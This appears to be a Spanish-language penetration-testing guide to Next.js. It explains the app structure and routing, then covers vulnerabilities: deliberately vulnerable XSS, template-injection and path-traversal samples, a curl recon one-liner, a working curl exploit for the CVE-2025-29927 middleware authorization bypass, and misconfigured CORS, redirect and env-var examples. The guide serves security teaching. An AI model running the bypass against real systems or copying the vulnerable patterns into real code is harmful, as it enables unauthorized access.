# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Arquitectura general de una aplicación Next.js

### Estructura de archivos típica

Un proyecto Next.js estándar sigue una estructura específica de archivos y directorios que facilita sus características como enrutamiento, endpoints de API y gestión de recursos estáticos. Aquí tienes una distribución típica:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Directorios y archivos principales

- **public/:** Aloja recursos estáticos como imágenes, fuentes y otros archivos. Los archivos aquí son accesibles en la ruta raíz (`/`).
- **app/:** Directorio central para las páginas, layouts, componentes y rutas API de tu aplicación. Adopta el paradigma **App Router**, habilitando características avanzadas de enrutamiento y la segregación de componentes servidor-cliente.
- **app/layout.tsx:** Define el layout raíz de tu aplicación, envolviendo todas las páginas y proporcionando elementos de interfaz consistentes como encabezados, pies de página y barras de navegación.
- **app/page.tsx:** Sirve como punto de entrada para la ruta raíz `/`, renderiza la página principal.
- **app/[route]/page.tsx:** Maneja rutas estáticas y dinámicas. Cada carpeta dentro de `app/` representa un segmento de ruta, y `page.tsx` dentro de esas carpetas corresponde al componente de la ruta.
- **app/api/:** Contiene rutas API, permitiéndote crear funciones serverless que manejan solicitudes HTTP. Estas rutas reemplazan el tradicional directorio `pages/api`.
- **app/components/:** Alberga componentes React reutilizables que se pueden utilizar en diferentes páginas y layouts.
- **app/styles/:** Contiene archivos CSS globales y CSS Modules para estilos con alcance por componente.
- **app/utils/:** Incluye funciones utilitarias, módulos auxiliares y otra lógica no relacionada con la interfaz de usuario que puede compartirse en la aplicación.
- **.env.local:** Almacena variables de entorno específicas del entorno de desarrollo local. Estas variables **no** se incluyen en el control de versiones.
- **next.config.js:** Personaliza el comportamiento de Next.js, incluyendo configuraciones de webpack, variables de entorno y ajustes de seguridad.
- **tsconfig.json:** Configura ajustes de TypeScript para el proyecto, habilitando la comprobación de tipos y otras características de TypeScript.
- **package.json:** Gestiona las dependencias del proyecto, scripts y metadatos.
- **README.md:** Proporciona documentación e información sobre el proyecto, incluyendo instrucciones de configuración, guías de uso y otros detalles relevantes.
- **yarn.lock / package-lock.json:** Bloquean las dependencias del proyecto a versiones específicas, asegurando instalaciones consistentes en distintos entornos.

## Lado del cliente en Next.js

### Enrutamiento basado en archivos en el directorio `app`

El directorio `app` es la piedra angular del enrutamiento en las últimas versiones de Next.js. Aprovecha el sistema de archivos para definir rutas, haciendo la gestión de rutas más intuitiva y escalable.

<details>

<summary>Manejo de la ruta raíz /</summary>

**Estructura de archivos:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Archivos clave:**

- **`app/page.tsx`**: Maneja las solicitudes a la ruta raíz `/`.
- **`app/layout.tsx`**: Define la estructura de la aplicación, envolviendo todas las páginas.

**Implementación:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Explicación:**

- **Definición de ruta:** El archivo `page.tsx` directamente bajo el directorio `app` corresponde a la ruta `/`.
- **Renderizado:** Este componente renderiza el contenido de la página principal.
- **Integración de layout:** El componente `HomePage` está envuelto por `layout.tsx`, que puede incluir cabeceras, pies de página y otros elementos comunes.

</details>

<details>

<summary>Manejo de otras rutas estáticas</summary>

**Ejemplo: ruta `/about`**

**Estructura de archivos:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementación:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Explicación:**

- **Definición de ruta:** El archivo `page.tsx` dentro de la carpeta `about` corresponde a la ruta `/about`.
- **Renderizado:** Este componente renderiza el contenido de la página `/about`.

</details>

<details>

<summary>Rutas dinámicas</summary>

Las rutas dinámicas permiten manejar rutas con segmentos variables, habilitando que las aplicaciones muestren contenido según parámetros como IDs, slugs, etc.

**Ejemplo: ruta `/posts/[id]`**

**Estructura de archivos:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementación:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Explicación:**

- **Segmento dinámico:** `[id]` indica un segmento dinámico en la ruta, capturando el parámetro `id` de la URL.
- **Acceso a parámetros:** El objeto `params` contiene los parámetros dinámicos, accesibles dentro del componente.
- **Coincidencia de rutas:** Cualquier ruta que coincida con `/posts/*`, como `/posts/1`, `/posts/abc`, etc., será gestionada por este componente.

</details>

<details>

<summary>Rutas anidadas</summary>

Next.js admite enrutamiento anidado, permitiendo estructuras de rutas jerárquicas que reflejan la estructura del directorio.

**Ejemplo: ruta `/dashboard/settings/profile`**

**Estructura de archivos:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementación:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Explicación:**

- **Anidamiento profundo:** El archivo `page.tsx` dentro de `dashboard/settings/profile/` corresponde a la ruta `/dashboard/settings/profile`.
- **Reflejo de la jerarquía:** La estructura del directorio refleja la ruta URL, mejorando la mantenibilidad y la claridad.

</details>

<details>

<summary>Rutas catch-all</summary>

Las rutas catch-all manejan múltiples segmentos anidados o rutas desconocidas, proporcionando flexibilidad en el manejo de rutas.

**Ejemplo: `/*` Route**

**Estructura de archivos:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementación:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Explicación:**

- **Catch-All Segment:** `[...slug]` captura todos los segmentos de ruta restantes como un array.
- **Usage:** Útil para manejar escenarios de enrutamiento dinámico como rutas generadas por usuarios, categorías anidadas, etc.
- **Route Matching:** Rutas como `/anything/here`, `/foo/bar/baz`, etc., son manejadas por este componente.

</details>

### Vulnerabilidades potenciales del lado del cliente

Mientras Next.js proporciona una base segura, prácticas de codificación inadecuadas pueden introducir vulnerabilidades. Las principales vulnerabilidades del lado del cliente incluyen:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

Los ataques XSS ocurren cuando scripts maliciosos son inyectados en sitios web de confianza. Los atacantes pueden ejecutar scripts en los navegadores de los usuarios, robando datos o realizando acciones en nombre del usuario.

**Ejemplo de código vulnerable:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Por qué es vulnerable:** Usar `dangerouslySetInnerHTML` con entradas no confiables permite a los atacantes inyectar scripts maliciosos.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Ocurre cuando las entradas de usuario se manejan incorrectamente en las plantillas, permitiendo que los atacantes inyecten y ejecuten plantillas o expresiones.

**Ejemplo de código vulnerable:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Por qué es vulnerable:** Si `template` o `data` incluyen contenido malicioso, pueden provocar la ejecución de código no deseado.

</details>

<details>

<summary>Client Path Traversal</summary>

Es una vulnerabilidad que permite a los atacantes manipular rutas del lado del cliente para realizar acciones no deseadas, como Cross-Site Request Forgery (CSRF). A diferencia de server-side path traversal, que apunta al sistema de archivos del servidor, CSPT se centra en explotar mecanismos del lado del cliente para redirigir solicitudes API legítimas a endpoints maliciosos.

**Ejemplo de código vulnerable:**

Una aplicación Next.js permite a los usuarios subir y descargar archivos. La función de descarga se implementa en el lado del cliente, donde los usuarios pueden especificar la ruta del archivo a descargar.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Attack Scenario

1. **Attacker's Objective**: Realizar un ataque CSRF para eliminar un archivo crítico (por ejemplo, `admin/config.json`) manipulando el `filePath`.
2. **Exploiting CSPT**:
- **Malicious Input**: El atacante crea una URL con un `filePath` manipulado como `../deleteFile/config.json`.
- **Resulting API Call**: El código client-side realiza una petición a `/api/files/../deleteFile/config.json`.
- **Server's Handling**: Si el servidor no valida el `filePath`, procesa la petición, pudiendo eliminar o exponer archivos sensibles.
3. **Executing CSRF**:
- **Crafted Link**: El atacante envía a la víctima un enlace o incrusta un script malicioso que dispara la petición de descarga con el `filePath` manipulado.
- **Outcome**: La víctima ejecuta la acción sin saberlo, provocando acceso o eliminación de archivos no autorizados.

#### Why It's Vulnerable

- **Lack of Input Validation**: El client-side permite entradas arbitrarias en `filePath`, habilitando path traversal.
- **Trusting Client Inputs**: La API server-side confía y procesa el `filePath` sin sanitización.
- **Potential API Actions**: Si el endpoint de la API realiza acciones que cambian estado (por ejemplo, delete, modify files), puede ser explotado vía CSPT.

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Usa las rutas descubiertas (por ejemplo `/docs`, `/docs/content/examples`, `/signin`) para realizar auth testing y endpoint discovery.

## Lado del servidor en Next.js

### Renderizado en el servidor (SSR)

Las páginas se renderizan en el servidor en cada solicitud, garantizando que el usuario reciba HTML totalmente renderizado. En este caso debes crear tu propio servidor personalizado para procesar las solicitudes.

**Casos de uso:**

- Contenido dinámico que cambia con frecuencia.
- Optimización SEO, ya que los motores de búsqueda pueden rastrear la página completamente renderizada.

**Implementación:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Generación de sitios estáticos (SSG)

Las páginas se pre-renderizan en tiempo de compilación, lo que se traduce en tiempos de carga más rápidos y menor carga en el servidor.

**Casos de uso:**

- Contenido que no cambia con frecuencia.
- Blogs, documentación, páginas de marketing.

**Implementación:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Funciones serverless (API Routes)

Next.js permite la creación de endpoints de API como funciones serverless. Estas funciones se ejecutan bajo demanda sin necesidad de un servidor dedicado.

**Casos de uso:**

- Manejo de envíos de formularios.
- Interacción con bases de datos.
- Procesamiento de datos o integración con APIs de terceros.

**Implementación:**

Con la introducción del directorio `app` en Next.js 13, el enrutamiento y el manejo de API se han vuelto más flexibles y potentes. Este enfoque moderno se alinea estrechamente con el sistema de enrutamiento basado en archivos, pero introduce capacidades mejoradas, incluyendo soporte para componentes del servidor y del cliente.

#### Manejador de ruta básico

**Estructura de archivos:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementación:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Explicación:**

- **Ubicación:** Las rutas de API se colocan bajo el directorio `app/api/`.
- **Nomenclatura de archivos:** Cada endpoint de API reside en su propia carpeta que contiene un archivo `route.js` o `route.ts`.
- **Funciones exportadas:** En lugar de una exportación por defecto, se exportan funciones específicas para métodos HTTP (p. ej., `GET`, `POST`).
- **Manejo de respuestas:** Usa el constructor `Response` para devolver respuestas, lo que permite un mayor control sobre encabezados y códigos de estado.

#### Cómo manejar otras rutas y métodos:

<details>

<summary>Manejo de métodos HTTP específicos</summary>

Next.js 13+ te permite definir manejadores para métodos HTTP específicos dentro del mismo archivo `route.js` o `route.ts`, fomentando un código más claro y organizado.

**Ejemplo:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explicación:**

- **Múltiples exportaciones:** Cada método HTTP (`GET`, `PUT`, `DELETE`) tiene su propia función exportada.
- **Parámetros:** El segundo argumento proporciona acceso a los parámetros de ruta a través de `params`.
- **Respuestas mejoradas:** Mayor control sobre los objetos response, permitiendo una gestión precisa de encabezados y códigos de estado.

</details>

<details>

<summary>Rutas Catch-All y anidadas</summary>

Next.js 13+ soporta funciones avanzadas de enrutamiento como catch-all routes y rutas API anidadas, permitiendo estructuras de API más dinámicas y escalables.

**Ejemplo de ruta Catch-All:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Explicación:**

- **Sintaxis:** `[...]` denota un segmento catch-all, que captura todas las rutas anidadas.
- **Uso:** Útil para APIs que necesitan manejar profundidades de rutas variables o segmentos dinámicos.

**Ejemplo de rutas anidadas:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Explicación:**

- **Anidamiento profundo:** Permite estructuras de API jerárquicas, reflejando relaciones entre recursos.
- **Acceso a parámetros:** Accede fácilmente a múltiples parámetros de ruta a través del objeto `params`.

</details>

<details>

<summary>Manejo de rutas API en Next.js 12 y versiones anteriores</summary>

## Rutas API en el directorio `pages` (Next.js 12 y anteriores)

Antes de que Next.js 13 introdujera el directorio `app` y mejorara las capacidades de enrutamiento, las rutas API se definían principalmente dentro del directorio `pages`. Este enfoque aún se usa ampliamente y es compatible con Next.js 12 y versiones anteriores.

#### Ruta API básica

**Estructura de archivos:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementación:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Explicación:**

- **Ubicación:** Las rutas API residen bajo el directorio `pages/api/`.
- **Exportación:** Usa `export default` para definir la función handler.
- **Firma de la función:** El handler recibe los objetos `req` (solicitud HTTP) y `res` (respuesta HTTP).
- **Enrutamiento:** El nombre de archivo (`hello.js`) se mapea al endpoint `/api/hello`.

#### Rutas API dinámicas

**Estructura de archivos:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementación:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Explicación:**

- **Segmentos dinámicos:** Los corchetes (`[id].js`) indican segmentos de ruta dinámicos.
- **Acceso a parámetros:** Usa `req.query.id` para acceder al parámetro dinámico.
- **Manejo de métodos:** Emplea lógica condicional para tratar los distintos métodos HTTP (`GET`, `PUT`, `DELETE`, etc.).

#### Manejo de diferentes métodos HTTP

Aunque el ejemplo básico de ruta API maneja todos los métodos HTTP dentro de una única función, puedes estructurar tu código para manejar cada método de forma explícita para mayor claridad y mantenibilidad.

**Ejemplo:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Buenas prácticas:**

- **Separación de responsabilidades:** Separa claramente la lógica para los distintos métodos HTTP.
- **Consistencia de respuestas:** Asegura estructuras de respuesta consistentes para facilitar el manejo en el lado del cliente.
- **Manejo de errores:** Gestiona de forma adecuada los métodos no soportados y los errores inesperados.

</details>

### Configuración de CORS

Controla qué orígenes pueden acceder a tus rutas API, mitigando vulnerabilidades de Cross-Origin Resource Sharing (CORS).

**Ejemplo de configuración incorrecta:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Ten en cuenta que **CORS también se puede configurar en todas las rutas de la API** dentro del archivo **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problema:**

- **`Access-Control-Allow-Origin: '*'`:** Permite que cualquier sitio web acceda a la API, potencialmente permitiendo que sitios maliciosos interactúen con tu API sin restricciones.
- **Permiso amplio de métodos:** Permitir todos los métodos puede habilitar a los atacantes para realizar acciones no deseadas.

**Cómo los atacantes lo explotan:**

Los atacantes pueden crear sitios web maliciosos que realicen solicitudes a tu API, potencialmente abusando de funcionalidades como recuperación de datos, manipulación de datos o desencadenando acciones no deseadas en nombre de usuarios autenticados.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Exposición del código del servidor en el lado del cliente

Puede ser fácil **usar código del servidor también en código expuesto y ejecutado en el lado del cliente**. La mejor manera de asegurarse de que un archivo de código nunca se exponga al lado del cliente es usando esta importación al principio del archivo:
```js
import "server-only"
```
## Archivos clave y sus funciones

### `middleware.ts` / `middleware.js`

**Ubicación:** Raíz del proyecto o dentro de `src/`.

**Propósito:** Ejecuta código en la función serverless del lado del servidor antes de que se procese una solicitud, permitiendo tareas como autenticación, redirecciones o modificar respuestas.

**Flujo de ejecución:**

1. **Solicitud entrante:** El middleware intercepta la solicitud.
2. **Procesamiento:** Realiza operaciones basadas en la solicitud (p. ej., comprobar autenticación).
3. **Modificación de la respuesta:** Puede alterar la respuesta o pasar el control al siguiente manejador.

**Ejemplos de uso:**

- Redirigir usuarios no autenticados.
- Agregar cabeceras personalizadas.
- Registrar solicitudes.

**Ejemplo de configuración:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Si la autorización se aplica en middleware, las versiones afectadas de Next.js (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) pueden eludirse inyectando el encabezado `x-middleware-subrequest`. El framework omitirá la recursión de middleware y devolverá la página protegida.

- El comportamiento por defecto suele ser una redirección 307 a una ruta de login como `/api/auth/signin`.
- Envía un valor largo para `x-middleware-subrequest` (repite `middleware` para alcanzar `MAX_RECURSION_DEPTH`) para cambiar la respuesta a 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Debido a que las páginas autenticadas cargan muchos subrecursos, añade la cabecera a cada solicitud (p. ej., Burp Match/Replace con una cadena de búsqueda vacía) para evitar que los recursos redirijan.

### `next.config.js`

**Location:** Raíz del proyecto.

**Purpose:** Configura el comportamiento de Next.js, habilitando o deshabilitando funcionalidades, personalizando las configuraciones de webpack, estableciendo variables de entorno y configurando varias características de seguridad.

**Key Security Configurations:**

<details>

<summary>Cabeceras de seguridad</summary>

Las cabeceras de seguridad mejoran la protección de tu aplicación al indicar a los navegadores cómo manejar el contenido. Ayudan a mitigar varios ataques como Cross-Site Scripting (XSS), Clickjacking y MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Ejemplos:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Configuración de optimización de imágenes</summary>

Next.js optimiza las imágenes para el rendimiento, pero las configuraciones incorrectas pueden conducir a vulnerabilidades de seguridad, como permitir que fuentes no confiables inyecten contenido malicioso.

**Ejemplo de mala configuración:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problem:**

- **`'*'`:** Permite que las imágenes se carguen desde cualquier origen externo, incluyendo dominios no confiables o maliciosos. Los atacantes pueden alojar imágenes que contengan payloads maliciosos o contenido que engañe a los usuarios.
- Otro problema podría ser permitir un dominio **donde cualquiera puede subir una imagen** (como `raw.githubusercontent.com`)

**How attackers abuse it:**

Al inyectar imágenes desde fuentes maliciosas, los atacantes pueden realizar ataques de phishing, mostrar información engañosa o explotar vulnerabilidades en las bibliotecas de renderizado de imágenes.

</details>

<details>

<summary>Exposición de variables de entorno</summary>

Gestiona la información sensible, como API keys y credenciales de bases de datos, de forma segura sin exponerla al cliente.

#### a. Exposición de variables sensibles

**Bad Configuration Example:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Problema:**

- **`SECRET_API_KEY`:** Sin el prefijo `NEXT_PUBLIC_`, Next.js no expone las variables al lado del cliente. Sin embargo, si por error se le añade el prefijo (p. ej., `NEXT_PUBLIC_SECRET_API_KEY`), se vuelve accesible en el lado del cliente.

**Cómo lo abusan los atacantes:**

Si variables sensibles se exponen al cliente, los atacantes pueden recuperarlas inspeccionando el código del lado del cliente o las peticiones de red, obteniendo acceso no autorizado a APIs, bases de datos u otros servicios.

</details>

<details>

<summary>Redirects</summary>

Gestiona redirecciones y reescrituras de URL dentro de tu aplicación, asegurando que los usuarios sean dirigidos adecuadamente sin introducir vulnerabilidades de open redirect.

#### a. Open Redirect Vulnerability

**Bad Configuration Example:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problema:**

- **Dynamic Destination:** Permite a los usuarios especificar cualquier URL, habilitando open redirect attacks.
- **Trusting User Input:** Redirigir a URLs proporcionadas por usuarios sin validación puede llevar a phishing, malware distribution, o credential theft.

**Cómo lo abusan los atacantes:**

Los atacantes pueden crear URLs que parecen originarse en tu dominio pero que redirigen a los usuarios a sitios maliciosos. Por ejemplo:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Los usuarios que confían en el dominio original podrían navegar sin saberlo a sitios web dañinos.

</details>

<details>

<summary>Configuración de Webpack</summary>

Personaliza las configuraciones de Webpack para tu aplicación Next.js, lo cual puede introducir vulnerabilidades de seguridad inadvertidamente si no se maneja con cautela.

#### a. Exposición de módulos sensibles

**Ejemplo de configuración incorrecta:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problema:**

- **Exposing Sensitive Paths:** La creación de alias de directorios sensibles y permitir el acceso desde el cliente puede leak información confidencial.
- **Bundling Secrets:** Si archivos sensibles se incluyen en el bundle para el cliente, su contenido se vuelve accesible a través de source maps o inspeccionando el código del lado del cliente.

**How attackers abuse it:**

Los atacantes pueden acceder o reconstruir la estructura de directorios de la aplicación, potencialmente encontrando y explotando archivos o datos sensibles.

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Purpose:** Sobrescribe el componente App por defecto, permitiendo estado global, estilos y componentes de layout.

**Use Cases:**

- Inyección de global CSS.
- Agregar layout wrappers.
- Integración de librerías de gestión de estado.

**Example:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Propósito:** Sobrescribe el Document predeterminado, permitiendo la personalización de las etiquetas HTML y Body.

**Casos de uso:**

- Modificar las etiquetas `<html>` o `<body>`.
- Agregar etiquetas meta o scripts personalizados.
- Integrar fuentes de terceros.

**Ejemplo:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Servidor personalizado (Opcional)

**Propósito:** Aunque Next.js incluye un servidor integrado, puedes crear un servidor personalizado para casos de uso avanzados como enrutamiento personalizado o integrar con servicios backend existentes.

**Nota:** Usar un servidor personalizado puede limitar las opciones de despliegue, especialmente en plataformas como Vercel que optimizan para el servidor integrado de Next.js.

**Ejemplo:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Consideraciones adicionales de arquitectura y seguridad

### Variables de entorno y configuración

**Propósito:** Gestionar información sensible y ajustes de configuración fuera del código.

**Mejores prácticas:**

- **Usar archivos `.env`:** Almacenar variables como claves API en `.env.local` (excluido del control de versiones).
- **Acceder a las variables de forma segura:** Usar `process.env.VARIABLE_NAME` para acceder a las variables de entorno.
